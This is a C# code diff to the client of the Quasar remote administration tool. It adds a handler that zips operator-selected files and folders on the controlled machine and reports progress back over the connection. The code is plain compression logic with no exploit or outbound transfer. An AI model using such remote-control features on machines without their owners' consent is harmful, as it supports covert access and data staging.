@@ -1,4 +1,5 @@
-﻿using Quasar.Client.Utilities;
+﻿using Ionic.Zip;
+using Quasar.Client.Utilities;
 using Quasar.Common.Enums;
 using Quasar.Common.Extensions;
 using Quasar.Common.IO;
@@ -6,6 +7,7 @@ using Quasar.Common.Messages;
 using Quasar.Common.Models;
 using System;
 using System.IO;
+using System.IO.Compression;
 using System.Security;
 using System.Threading;
 
@@ -225,6 +227,61 @@ namespace Quasar.Client.Commands
             {
                 if (isError && !string.IsNullOrEmpty(message))
                     client.Send(new SetStatusFileManager {Message = message, SetLastDirectorySeen = false});
+            }
+        }
+
+        public static void HandleDoZipDirectory(DoZipDirectory command, Networking.Client client) 
+        {
+            string fileName = Path.GetFileName(command.ArchivePath);
+            bool isError = false;
+            string message = null;
+
+            Action<string> onError = (msg) => {
+                isError = true;
+                message = msg;
+            };
+
+            try
+            {
+                using (ZipFile zip = new ZipFile())
+                {
+                    for (int i = 0; i < command.PathList.Length; i++)
+                    {
+                        string path = command.PathList[i];
+                        FileType type = command.TypeList[i];
+                        switch (type)
+                        {
+                            case FileType.File:
+                                zip.AddFile(path);
+                                break;
+                            case FileType.Directory:
+                                zip.AddDirectory(path);
+                                break;
+                        }
+                    }
+                    zip.SaveProgress += (s, e) =>
+                    {
+                        double percent = e.BytesTransferred / (0.01 * e.TotalBytesToTransfer);
+                        if (Double.IsNaN(percent)) return;
+                        string percentMessage = string.Format("Compressing ({0}) - {1}", fileName, percent.ToString("0.00") + "%");
+                        client.Send(new SetStatusFileManager { Message = percentMessage, SetLastDirectorySeen = false });
+                    };
+                    zip.Save(command.ArchivePath);
+                    client.Send(new SetStatusFileManager
+                    {
+                        Message = string.Format("Compressed! ({0})", fileName),
+                        SetLastDirectorySeen = false
+                    });
+                }
+            }
+            catch (Exception ex)
+            {
+                onError(string.Format("Compression failed ({0}) - {1}", fileName, ex.Message));
+            }
+            finally
+            {
+                if (isError && !string.IsNullOrEmpty(message))
+                    client.Send(new SetStatusFileManager { Message = message, SetLastDirectorySeen = false });
             }
         }
 
